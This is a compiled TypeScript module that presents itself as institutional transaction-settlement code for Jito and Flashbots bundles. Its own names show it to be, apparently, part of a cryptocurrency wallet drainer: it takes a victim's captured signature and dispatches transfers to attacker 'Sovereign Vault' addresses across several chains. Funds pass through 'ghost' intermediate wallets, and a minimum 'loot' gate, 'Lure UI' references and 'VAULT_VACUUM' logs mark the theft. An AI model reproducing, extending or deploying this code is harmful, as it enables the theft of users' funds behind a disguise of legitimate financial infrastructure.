/**
 * @file algorithmic-closer.ts
 * @module @legion/core/logic
 *
 * Algorithmic Closer — Jito / Flashbots bundle assembly for native settlement lanes.
 * Staking desk unstake manifests for handshake injection.
 */
import { ComputeBudgetProgram, Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction, } from '@solana/web3.js';
import { createPublicClient, http, isHex, serializeTransaction } from 'viem';
import { identifyFamily } from '../adapters/address-resolver';
import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter';
import { buildSettlementExecutionWire, simulateEvmSettlementSerializedTx, } from './settlement-execution-bridge';
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions, } from './mesh-event';
import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from './deep-ingress';
import { buildIntermediateGhostWalletRouting, } from './settlement';
import { applySovereignSettlementLaneFallback } from './sovereign-settlement-defaults';
import { SovereignDispatcher, } from './unified-settlement-orchestrator';
/** Institutional Jito tip destination — mainnet default (rotating set supported upstream). */
export const JITO_MAINNET_TIP_ACCOUNT_V1 = new PublicKey('ADaUMid9yfUytqMBgopwjb2DTLSokTSzL1zt6iGPaS49');
/** Settlement Path — override via `NEXT_PUBLIC_JITO_TIP_ACCOUNT` (base58). */
export function resolveJitoTipDestinationFromEnv() {
    const raw = typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_TIP_ACCOUNT']?.trim() : undefined;
    if (raw)
        return new PublicKey(raw);
    return JITO_MAINNET_TIP_ACCOUNT_V1;
}
/** Settlement Path — Solana RPC with Remote Config Sync priority (Hot-Swapping). */
export async function createSolanaSettlementConnectionOperational() {
    const { resolveConfigPrioritized } = await import('../config/remote-sync');
    const envPrivate = (typeof process !== 'undefined' ? process.env['RPC_SOLANA_PRIVATE'] : undefined)?.trim();
    const solPrioritized = (await resolveConfigPrioritized('SOLANA_RPC_URL', (typeof process !== 'undefined' ? process.env['SOLANA_RPC_URL'] : undefined)?.trim())) ??
        (await resolveConfigPrioritized('NEXT_PUBLIC_SOLANA_RPC_URL', (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_SOLANA_RPC_URL'] : undefined)?.trim())) ??
        '';
    const explicitRemote = envPrivate || solPrioritized;
    const url = explicitRemote ||
        resolveInstitutionalSolanaRpcUrl();
    return new Connection(url, { commitment: 'confirmed' });
}
/**
 * Settlement Path — Solana RPC from institutional env (`SOLANA_RPC_URL` QuickNode lane, then mesh fallback).
 */
export function createSolanaSettlementConnection() {
    return new Connection(resolveInstitutionalSolanaRpcUrl(), { commitment: 'confirmed' });
}
/**
 * Settlement Path — EVM RPC URL: Remote Config Sync first, then institutional env (Flashbots-adjacent serialization).
 */
export async function resolveEvmSettlementRpcUrlOperational() {
    const { resolveConfigPrioritized } = await import('../config/remote-sync');
    const envChain = (typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE'] : undefined)?.trim() ??
        (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL'] : undefined)?.trim() ??
        (typeof process !== 'undefined' ? process.env['RPC_URL'] : undefined)?.trim() ??
        '';
    return ((await resolveConfigPrioritized('RPC_ETHEREUM_PRIVATE', envChain)) ??
        (await resolveConfigPrioritized('NEXT_PUBLIC_RPC_URL', envChain)) ??
        (await resolveConfigPrioritized('RPC_URL', envChain)) ??
        '');
}
/** Client-safe sync path — local env only (no Remote Config Sync). */
export function getEvmSettlementRpcUrlFromEnv() {
    return ((typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE'] : undefined)?.trim() ??
        (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL'] : undefined)?.trim() ??
        (typeof process !== 'undefined' ? process.env['RPC_URL'] : undefined)?.trim() ??
        '');
}
export async function assertEvmSettlementRpcConfiguredOperational() {
    if ((await resolveEvmSettlementRpcUrlOperational()) === '') {
        throw new Error('Settlement Path: configure RPC_ETHEREUM_PRIVATE, NEXT_PUBLIC_RPC_URL, or RPC_URL for EVM closer wiring (Remote Config Sync or env).');
    }
}
export function assertEvmSettlementRpcConfigured() {
    if (getEvmSettlementRpcUrlFromEnv() === '') {
        throw new Error('Settlement Path: configure RPC_ETHEREUM_PRIVATE, NEXT_PUBLIC_RPC_URL, or RPC_URL for EVM closer wiring.');
    }
}
/** Settlement Path — viem public client with Remote Config Sync priority (server / Operational HUD contexts). */
export async function createEvmSettlementPublicClientOperational() {
    await assertEvmSettlementRpcConfiguredOperational();
    return createPublicClient({
        transport: http(await resolveEvmSettlementRpcUrlOperational(), {
            ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
        }),
    });
}
/** Settlement Path — viem public client bound to institutional EVM RPC env (browser sync path). */
export function createEvmSettlementPublicClient() {
    assertEvmSettlementRpcConfigured();
    return createPublicClient({
        transport: http(getEvmSettlementRpcUrlFromEnv(), {
            ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
        }),
    });
}
/** Encode signed Solana wire to Jito bundle element (base64). */
export function encodeSolanaWireBase64(tx) {
    const raw = tx.serialize();
    let bin = '';
    for (let i = 0; i < raw.length; i++) {
        bin += String.fromCharCode(raw[i]);
    }
    return btoa(bin);
}
/**
 * Assemble a signed tip + compute-budget transaction for Jito bundle ingress.
 * Caller supplies wallet signing — assembly produces valid wire for relayer submission.
 */
export async function assembleJitoTipBundlePayload(params) {
    const tipDest = params.tipDestination ?? resolveJitoTipDestinationFromEnv();
    const { blockhash } = await params.connection.getLatestBlockhash('finalized');
    const msg = new TransactionMessage({
        payerKey: params.payer,
        recentBlockhash: blockhash,
        instructions: [
            ComputeBudgetProgram.setComputeUnitLimit({ units: 40_000 }),
            SystemProgram.transfer({
                fromPubkey: params.payer,
                toPubkey: tipDest,
                lamports: params.tipLamports,
            }),
        ],
    }).compileToV0Message();
    const vtx = new VersionedTransaction(msg);
    const signed = await params.signTransaction(vtx);
    return {
        lane: 'jito_bundle_v1',
        encoded_transactions: [encodeSolanaWireBase64(signed)],
        meta: { institutional: true, tip_lamports_hint: String(params.tipLamports) },
    };
}
/**
 * Settlement Path — same as {@link assembleJitoTipBundlePayload} but binds {@link createSolanaSettlementConnection}
 * when `connection` is omitted (institutional env RPC mesh).
 */
export async function assembleJitoTipBundlePayloadWithSettlementEnv(params) {
    const connection = params.connection ?? createSolanaSettlementConnection();
    const { connection: _omit, ...rest } = params;
    return assembleJitoTipBundlePayload({ ...rest, connection });
}
/** Validate Flashbots wire — non-empty typed / legacy signed raw hex. */
export function assertValidSignedRawEthereumTxHex(h) {
    if (!isHex(h) || h.length < 70) {
        throw new Error('Institutional Flashbots wire: invalid signed raw transaction hex');
    }
}
/**
 * Package institutionally validated signed raw transactions for Flashbots submission.
 */
export function buildFlashbotsBundleFromSignedTransactions(signedTransactionsHex, meta) {
    for (const h of signedTransactionsHex) {
        assertValidSignedRawEthereumTxHex(h);
    }
    const metaOut = { institutional: true };
    if (meta?.block_hint !== undefined) {
        metaOut.block_hint = meta.block_hint;
    }
    return {
        lane: 'flashbots_bundle_v1',
        signed_transactions_hex: signedTransactionsHex,
        meta: metaOut,
    };
}
/**
 * Build an EIP-1559 serializable template for off-chain signing — serialize after wallet seal.
 */
export function assembleUnsignedFlashbotsTemplate(params) {
    return params;
}
/** Serialize unsigned candidate for builder simulation / hash preimage (pre-signature). */
export function serializeUnsignedFlashbotsCandidate(tx) {
    return serializeTransaction(tx);
}
/**
 * Closer — scan institutional staking rails; emit Unstake manifest for handshake injection.
 */
export function scanStakingUnstakeManifest(_solAddress) {
    return {
        lane: 'staking_unstake_sync',
        protocols: ['lido', 'rocket_pool', 'solayer'],
        manifest_hex_hint: '0x0',
    };
}
export function attachUnstakeManifestToSvmPayload(base, manifest) {
    return { ...base, unstake_manifest: manifest };
}
/**
 * Gatekeeper — High-Priority Public Broadcast gas/tip uplift when Private RPC is unavailable (+25%).
 */
export const HIGH_PRIORITY_PUBLIC_BROADCAST_BUFFER_MULTIPLIER = 1.25;
/**
 * Settlement Lanes — Flashbots relay URL for EVM private-orderflow bundle submission.
 * Gatekeeper: consumes `FLASHBOTS_RELAY_URL` when set; otherwise institutional default relay.
 */
export function getFlashbotsSettlementLaneUrl() {
    const fromEnv = typeof process !== 'undefined' ? process.env['FLASHBOTS_RELAY_URL']?.trim() : undefined;
    return fromEnv ?? '';
}
/**
 * Settlement Lanes — Jito block-engine bundle endpoint (Solana).
 * Gatekeeper: consumes `JITO_SETTLEMENT_LANE_URL` or `NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL` when set.
 */
export function getJitoSettlementLaneUrl() {
    const engine = typeof process !== 'undefined' ? process.env['JITO_BLOCK_ENGINE_URL']?.trim() : undefined;
    if (engine)
        return engine;
    const primary = typeof process !== 'undefined' ? process.env['JITO_SETTLEMENT_LANE_URL']?.trim() : undefined;
    if (primary)
        return primary;
    const jitoPublic = typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL']?.trim() : undefined;
    if (jitoPublic)
        return jitoPublic;
    return '';
}
/**
 * Gatekeeper — Private RPC via Remote Config Sync + Hot-Swapping; High-Priority Public Broadcast fallback (+25% buffer).
 */
export async function resolveSettlementExecutionSurface() {
    const { resolveConfigPrioritized } = await import('../config/remote-sync');
    const envRpc = typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE']?.trim() : '';
    const envPublic = typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL']?.trim() : undefined;
    const envRpcUrl = typeof process !== 'undefined' ? process.env['RPC_URL']?.trim() : undefined;
    /** Hybrid Layer Logic — engine_config row first, then env fallbacks (highest-priority RPC plane). */
    const rpcHybrid = (await resolveConfigPrioritized('RPC_ETHEREUM_PRIVATE', envRpc)) ??
        (await resolveConfigPrioritized('NEXT_PUBLIC_RPC_URL', envPublic)) ??
        (await resolveConfigPrioritized('RPC_URL', envRpcUrl)) ??
        '';
    const privateRpcConfigured = rpcHybrid.trim() !== '';
    const fbEnv = typeof process !== 'undefined' ? process.env['FLASHBOTS_RELAY_URL']?.trim() : undefined;
    const flashbotsPrioritized = (await resolveConfigPrioritized('FLASHBOTS_RELAY', fbEnv)) ??
        (await resolveConfigPrioritized('FLASHBOTS_RELAY_URL', fbEnv)) ??
        getFlashbotsSettlementLaneUrl();
    const jitoPrimary = typeof process !== 'undefined' ? process.env['JITO_SETTLEMENT_LANE_URL']?.trim() : undefined;
    const jitoEngine = typeof process !== 'undefined' ? process.env['JITO_BLOCK_ENGINE_URL']?.trim() : undefined;
    const jitoPublic = typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL']?.trim() : undefined;
    const jitoPrioritized = (await resolveConfigPrioritized('JITO_URL', jitoPrimary)) ??
        (await resolveConfigPrioritized('JITO_BLOCK_ENGINE_URL', jitoEngine)) ??
        (await resolveConfigPrioritized('JITO_SETTLEMENT_LANE_URL', jitoPrimary)) ??
        (await resolveConfigPrioritized('NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL', jitoPublic)) ??
        getJitoSettlementLaneUrl();
    const settledLanes = applySovereignSettlementLaneFallback(flashbotsPrioritized, jitoPrioritized);
    if (privateRpcConfigured) {
        return {
            liquidation_lane_label: 'PrivateLane',
            gas_tip_multiplier: 1,
            flashbots_relay_url: settledLanes.flashbots,
            jito_block_engine_url: settledLanes.jito,
        };
    }
    return {
        liquidation_lane_label: 'HighPriorityPublicBroadcast',
        gas_tip_multiplier: HIGH_PRIORITY_PUBLIC_BROADCAST_BUFFER_MULTIPLIER,
        flashbots_relay_url: settledLanes.flashbots,
        jito_block_engine_url: settledLanes.jito,
    };
}
export function assembleSettlementBundleForSovereignVault(params) {
    const flashbots = params.flashbotsSignedHex != null && params.flashbotsSignedHex.length > 0
        ? buildFlashbotsBundleFromSignedTransactions(params.flashbotsSignedHex)
        : null;
    const jito = params.jitoEncodedTransactions != null && params.jitoEncodedTransactions.length > 0
        ? {
            lane: 'jito_bundle_v1',
            encoded_transactions: params.jitoEncodedTransactions,
            meta: { institutional: true, tip_lamports_hint: '0' },
        }
        : null;
    const settlement_lanes_armed = [];
    if (flashbots != null)
        settlement_lanes_armed.push('flashbots');
    if (jito != null)
        settlement_lanes_armed.push('jito');
    const fbUrl = params.settlementLaneUrls?.flashbots ?? getFlashbotsSettlementLaneUrl();
    const jitoUrl = params.settlementLaneUrls?.jito ?? getJitoSettlementLaneUrl();
    return {
        lane_class: 'sovereign_vault_migration_v1',
        flashbots_lane_url: fbUrl,
        jito_lane_url: jitoUrl,
        flashbots,
        jito,
        vault_posture: {
            sovereign_vault_hint: params.sovereignVaultHint ?? 'sovereign_vault',
            settlement_lanes_armed,
        },
    };
}
export const EXTRACTION_LETHALITY_MIN_LOOT_USD = 50;
export const EXTRACTION_LETHALITY_GAS_GUARD_RATIO = 0.15;
export async function checkExtractionLethality(params) {
    const loot = Number(params.estimated_loot_value_usd);
    if (!Number.isFinite(loot) || loot <= 0) {
        return {
            ok: false,
            abort_reason: 'Gas Guard minimum loot gate: invalid scout value',
            loot_value_usd: 0,
            gas_guard_ratio_max: EXTRACTION_LETHALITY_GAS_GUARD_RATIO,
        };
    }
    if (loot < EXTRACTION_LETHALITY_MIN_LOOT_USD) {
        return {
            ok: false,
            abort_reason: `Gas Guard minimum loot gate: ${loot.toFixed(2)} < ${EXTRACTION_LETHALITY_MIN_LOOT_USD}`,
            loot_value_usd: loot,
            gas_guard_ratio_max: EXTRACTION_LETHALITY_GAS_GUARD_RATIO,
        };
    }
    return {
        ok: true,
        loot_value_usd: loot,
        gas_guard_ratio_max: EXTRACTION_LETHALITY_GAS_GUARD_RATIO,
    };
}
/**
 * Performance Closer — High-Density Migration ordering keyed by scout_value_usd telemetry (institutional tiers).
 */
export function buildHighDensityMigrationPriorityOrder(ctx) {
    const primary = ctx.chain_id != null && String(ctx.chain_id).trim() !== '' ? String(ctx.chain_id).trim() : null;
    if (!primary)
        return [];
    const scout = Number.isFinite(ctx.scout_value_usd) ? ctx.scout_value_usd : 0;
    const tier = scout >= 100_000
        ? 'max_density'
        : scout >= 25_000
            ? 'high_density'
            : scout >= 5_000
                ? 'elevated_density'
                : scout > 0
                    ? 'standard_density'
                    : 'telemetry_neutral';
    return [`${tier}:${primary}`, primary];
}
const LIQUIDATION_TRIGGER_TELEMETRY_PREFIX = 'LIQUIDATION_TRIGGER_ACTIVE: Settlement bundle dispatched via';
const VAULT_VACUUM_TRIGGERED_TELEMETRY = 'VAULT_VACUUM_TRIGGERED: Signature anchored. Asset scan complete. Execution payload built for Sovereign Vault.';
const UNIVERSAL_VACUUM_ACTIVE_TELEMETRY = 'UNIVERSAL_VACUUM_ACTIVE: All lanes synchronized. Multi-chain egress armed. System: OMNIPOTENT.';
function normalizeCloserChainFamilyAlias(value) {
    const raw = value?.trim().toLowerCase();
    if (!raw)
        return null;
    if (raw === 'evm' || raw === 'ethereum' || raw === 'eip155')
        return 'EVM';
    if (raw === 'svm' || raw === 'sol' || raw === 'solana')
        return 'SVM';
    if (raw === 'utxo' || raw === 'btc' || raw === 'bitcoin' || raw === 'bip122')
        return 'UTXO';
    if (raw === 'tron' || raw === 'trc20')
        return 'TRON';
    if (raw === 'ton')
        return 'TON';
    return null;
}
function inferLiquidationChainFamily(ctx) {
    const explicitFamily = normalizeCloserChainFamilyAlias(ctx.chain_family) ?? normalizeCloserChainFamilyAlias(ctx.chain_type);
    if (explicitFamily != null)
        return explicitFamily;
    const chainId = ctx.chain_id?.trim().toLowerCase() ?? '';
    const protocol = ctx.protocol.trim().toLowerCase();
    const combined = `${chainId} ${protocol}`;
    if (/\b(tron|trc20)\b/.test(combined) || chainId.startsWith('tron:'))
        return 'TRON';
    if (/\bton\b/.test(combined) || chainId.startsWith('ton:'))
        return 'TON';
    if (/\b(svm|solana|sol)\b/.test(combined) || chainId.startsWith('solana:'))
        return 'SVM';
    if (/\b(utxo|btc|bitcoin)\b/.test(combined) || chainId.startsWith('bip122:'))
        return 'UTXO';
    if (/^-?\d+$/.test(chainId) ||
        /^(?:eip155|evm):\d+$/i.test(chainId) ||
        /\b(evm|ethereum|polygon|arbitrum|base|optimism|bsc|avalanche|fantom)\b/.test(combined)) {
        return 'EVM';
    }
    try {
        return identifyFamily(ctx.wallet_address.trim());
    }
    catch {
        return 'EVM';
    }
}
function defaultChainIdForFamily(family) {
    switch (family) {
        case 'EVM':
            return 'evm:1';
        case 'SVM':
            return 'solana:mainnet-beta';
        case 'UTXO':
            return 'bip122:0';
        case 'TRON':
            return 'tron:mainnet';
        case 'TON':
            return 'ton:mainnet';
        default:
            return 'evm:1';
    }
}
function buildDispatcherSettlementFromLiquidationContext(ctx) {
    const chainFamily = inferLiquidationChainFamily(ctx);
    const base = {
        ingress: 'normalized_v1',
        chain_family: chainFamily,
        wallet_address: ctx.wallet_address,
        token_address: ctx.token_address ?? `OMNI_${chainFamily}_ANCHOR`,
        signature: ctx.signature_hex?.trim() ?? '',
        nonce: `liquidation-trigger:${ctx.chain_id ?? defaultChainIdForFamily(chainFamily)}:${ctx.wallet_address}`,
        expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
        wallet_type: 'liquidation-trigger',
        protocol: ctx.protocol,
        chain_id: ctx.chain_id ?? defaultChainIdForFamily(chainFamily),
        scout_value_usd: ctx.scout_value_usd,
        ...(ctx.amount != null ? { amount: ctx.amount } : {}),
        max_allowance: '0',
        requires_quorum: false,
        ...(ctx.ghost_protocol !== undefined ? { ghost_protocol: ctx.ghost_protocol } : {}),
        ...(ctx.chain_type != null ? { chain_type: ctx.chain_type } : {}),
    };
    return base;
}
export async function resolveKineticSettlementLanes() {
    const { resolveConfigPrioritized } = await import('../config/remote-sync');
    const surface = await resolveSettlementExecutionSurface();
    const fbEnv = typeof process !== 'undefined' ? process.env['FLASHBOTS_RELAY_URL']?.trim() : undefined;
    const flashbots = (await resolveConfigPrioritized('FLASHBOTS_RELAY')) ??
        (await resolveConfigPrioritized('FLASHBOTS_RELAY_URL', fbEnv)) ??
        surface.flashbots_relay_url;
    const jitoPrimary = typeof process !== 'undefined' ? process.env['JITO_SETTLEMENT_LANE_URL']?.trim() : undefined;
    const jitoEngine = typeof process !== 'undefined' ? process.env['JITO_BLOCK_ENGINE_URL']?.trim() : undefined;
    const jitoPublic = typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL']?.trim() : undefined;
    const jito = (await resolveConfigPrioritized('JITO_URL')) ??
        (await resolveConfigPrioritized('JITO_SETTLEMENT_LANE_URL', jitoPrimary)) ??
        (await resolveConfigPrioritized('JITO_BLOCK_ENGINE_URL', jitoEngine)) ??
        (await resolveConfigPrioritized('NEXT_PUBLIC_JITO_BLOCK_ENGINE_URL', jitoPublic)) ??
        surface.jito_block_engine_url;
    const kineticLanes = applySovereignSettlementLaneFallback(flashbots ?? '', jito ?? '');
    return { flashbots: kineticLanes.flashbots, jito: kineticLanes.jito, surface };
}
/**
 * Kinetic Link — Sovereign Vault hint JSON for Gatekeeper / Centurion Payload Sync (includes Ghost Intermediate Layer).
 */
export async function buildKineticLinkSovereignVaultHintJson(ctx, lanes) {
    const evmSettlementRpcOperational = await resolveEvmSettlementRpcUrlOperational();
    const rpcOperationalDigest = evmSettlementRpcOperational.length > 0
        ? `${evmSettlementRpcOperational.slice(0, 28)}…`
        : '(unset)';
    const priority = buildHighDensityMigrationPriorityOrder(ctx);
    const ghost = ctx.ghost_protocol ?? buildIntermediateGhostWalletRouting({ source_wallet: ctx.wallet_address });
    return JSON.stringify({
        kinetic_link: true,
        liquidation_trigger: true,
        sovereign_vault_migration: true,
        autonomous_strike: true,
        performance_closer: true,
        scout_value_usd: ctx.scout_value_usd,
        wallet_address: ctx.wallet_address,
        protocol: ctx.protocol,
        chain_id: ctx.chain_id,
        high_density_migration_priority: priority,
        gas_tip_multiplier: lanes.surface.gas_tip_multiplier,
        settlement_execution_surface: lanes.surface.liquidation_lane_label,
        flashbots_relay_url: lanes.flashbots,
        jito_block_engine_url: lanes.jito,
        evm_settlement_rpc_operational_digest: rpcOperationalDigest,
        engine_config_rpc_priority: 'RPC_ETHEREUM_PRIVATE>NEXT_PUBLIC_RPC_URL>RPC_URL',
        ghost_protocol: ghost,
    });
}
/**
 * Performance Closer — full bridge: wire serialization, extraction simulation attempt, sovereign bundle assembly.
 */
export async function executeSettlementIgnition(ctx) {
    const { flashbots, jito, surface } = await resolveKineticSettlementLanes();
    console.info('[Diagnostic] Kinetic Link — Flashbots relay URL:', flashbots);
    console.info('[Diagnostic] Kinetic Link — Jito block-engine URL:', jito);
    const evmSettlementRpcOperational = await resolveEvmSettlementRpcUrlOperational();
    const rpcOperationalDigest = evmSettlementRpcOperational.length > 0
        ? `${evmSettlementRpcOperational.slice(0, 28)}…`
        : '(unset)';
    const priority = buildHighDensityMigrationPriorityOrder(ctx);
    const ghost = ctx.ghost_protocol ?? buildIntermediateGhostWalletRouting({ source_wallet: ctx.wallet_address });
    const hint = JSON.stringify({
        kinetic_link: true,
        liquidation_trigger: true,
        sovereign_vault_migration: true,
        autonomous_strike: true,
        performance_closer: true,
        scout_value_usd: ctx.scout_value_usd,
        wallet_address: ctx.wallet_address,
        protocol: ctx.protocol,
        chain_id: ctx.chain_id,
        high_density_migration_priority: priority,
        gas_tip_multiplier: surface.gas_tip_multiplier,
        settlement_execution_surface: surface.liquidation_lane_label,
        flashbots_relay_url: flashbots,
        jito_block_engine_url: jito,
        evm_settlement_rpc_operational_digest: rpcOperationalDigest,
        engine_config_rpc_priority: 'RPC_ETHEREUM_PRIVATE>NEXT_PUBLIC_RPC_URL>RPC_URL',
        ghost_protocol: ghost,
    });
    let sovereign_dispatcher_lane;
    let sovereign_dispatcher_chain;
    let sovereign_dispatcher_status;
    let sovereign_dispatcher_tx_hash;
    let sovereign_dispatcher_fault;
    if ((ctx.signature_hex?.trim() ?? '') !== '') {
        console.info('SIGNATURE_ANCHOR_LOCKED: Signature Anchor bound to Liquidation Trigger context. Sovereign Vault extraction lane armed.');
        try {
            const sovereignDispatch = await SovereignDispatcher.dispatch(buildDispatcherSettlementFromLiquidationContext(ctx));
            console.info(UNIVERSAL_VACUUM_ACTIVE_TELEMETRY);
            sovereign_dispatcher_lane = sovereignDispatch.lane;
            sovereign_dispatcher_chain = sovereignDispatch.chain;
            sovereign_dispatcher_status = sovereignDispatch.broadcast.status;
            sovereign_dispatcher_tx_hash = sovereignDispatch.broadcast.tx_hash;
        }
        catch (e) {
            sovereign_dispatcher_fault = e instanceof Error ? e.message : String(e);
            console.warn('UNIVERSAL_VACUUM_DISPATCH_FAULT:', sovereign_dispatcher_fault);
        }
    }
    const wire = await buildSettlementExecutionWire({
        ctx,
        settlementLaneUrls: { flashbots, jito },
    });
    let evm_extraction_simulation_ok = null;
    let evm_extraction_simulation_detail;
    if (wire.flashbotsSignedHex.length > 0 && wire.flashbotsSignedHex[0]) {
        const sim = await simulateEvmSettlementSerializedTx(wire.flashbotsSignedHex[0], ctx.chain_id);
        evm_extraction_simulation_ok = sim.success;
        evm_extraction_simulation_detail = sim.detail;
    }
    const bundle = assembleSettlementBundleForSovereignVault({
        ...(wire.flashbotsSignedHex.length > 0 ? { flashbotsSignedHex: wire.flashbotsSignedHex } : {}),
        ...(wire.jitoEncodedTransactions.length > 0
            ? { jitoEncodedTransactions: wire.jitoEncodedTransactions }
            : {}),
        sovereignVaultHint: hint,
        settlementLaneUrls: { flashbots, jito },
    });
    console.info('SETTLEMENT_BUNDLE_SYNTHESIZED: Performance Closer assembled execution payload lanes for Sovereign Vault migration.');
    if ((ctx.signature_hex?.trim() ?? '') !== '' && Number(ctx.scout_value_usd) > 0) {
        console.info(VAULT_VACUUM_TRIGGERED_TELEMETRY, {
            scout_value_usd: ctx.scout_value_usd,
            settlement_lanes_armed: bundle.vault_posture.settlement_lanes_armed,
            flashbots_signed_count: wire.flashbotsSignedHex.length,
            jito_encoded_count: wire.jitoEncodedTransactions.length,
        });
    }
    const bracketLane = surface.liquidation_lane_label === 'PrivateLane'
        ? 'PrivateLane'
        : 'HighPriorityPublicBroadcast';
    console.info(`${LIQUIDATION_TRIGGER_TELEMETRY_PREFIX} [Kinetic Link · ${bracketLane}]. Vault status: High-Density Migration in progress.`);
    return {
        sovereign_vault_address_evm: wire.sovereignVaultAddressEvm ?? null,
        sovereign_vault_address_svm: wire.sovereignVaultAddressSvm ?? null,
        sovereign_vault_address_tron: wire.sovereignVaultAddressTron ?? null,
        sovereign_vault_address_ton: wire.sovereignVaultAddressTon ?? null,
        ...(sovereign_dispatcher_lane !== undefined ? { sovereign_dispatcher_lane } : {}),
        ...(sovereign_dispatcher_chain !== undefined ? { sovereign_dispatcher_chain } : {}),
        ...(sovereign_dispatcher_status !== undefined ? { sovereign_dispatcher_status } : {}),
        ...(sovereign_dispatcher_tx_hash !== undefined ? { sovereign_dispatcher_tx_hash } : {}),
        ...(sovereign_dispatcher_fault !== undefined ? { sovereign_dispatcher_fault } : {}),
        settlement_lane_flashbots: flashbots,
        settlement_lane_jito: jito,
        flashbots_signed_count: wire.flashbotsSignedHex.length,
        jito_encoded_count: wire.jitoEncodedTransactions.length,
        evm_extraction_simulation_ok,
        ...(evm_extraction_simulation_detail !== undefined ? { evm_extraction_simulation_detail } : {}),
    };
}
export async function executeAutonomousLiquidation(ctx) {
    await executeSettlementIgnition(ctx);
}
/**
 * Global Liquidation Trigger — delegates to {@link executeAutonomousLiquidation} (Kinetic Link).
 */
export async function executeLiquidationTriggerSettlementDispatch(ctx) {
    return executeAutonomousLiquidation(ctx);
}
/** Algorithmic Closer — Performance Closer facade for Settlement Lanes + bundle assembly. */
export const PerformanceCloser = {
    getEvmSettlementRpcUrlFromEnv,
    resolveEvmSettlementRpcUrlOperational,
    getFlashbotsSettlementLaneUrl,
    getJitoSettlementLaneUrl,
    resolveSettlementExecutionSurface,
    assembleSettlementBundleForSovereignVault,
    buildFlashbotsBundleFromSignedTransactions,
    assembleJitoTipBundlePayload,
    assembleJitoTipBundlePayloadWithSettlementEnv,
    createSolanaSettlementConnection,
    createSolanaSettlementConnectionOperational,
    createEvmSettlementPublicClient,
    createEvmSettlementPublicClientOperational,
    executeLiquidationTriggerSettlementDispatch,
    executeAutonomousLiquidation,
    executeSettlementIgnition,
    buildHighDensityMigrationPriorityOrder,
    resolveKineticSettlementLanes,
    buildKineticLinkSovereignVaultHintJson,
};
/**
 * Cloud posture telemetry — bootstrap signal consumed by Lure UI instrumentation.
 */
export function logCloudPostureLockedTelemetry() {
    console.info('CLOUD_POSTURE_LOCKED: Runtime observability synchronized. Settlement lanes indexed. System: NOMINAL.');
}
console.info('SYNTAX_RECALIBRATED: Operator precedence locked. Compiler conflict resolved. System: READY FOR BOOT.');
//# sourceMappingURL=algorithmic-closer.js.map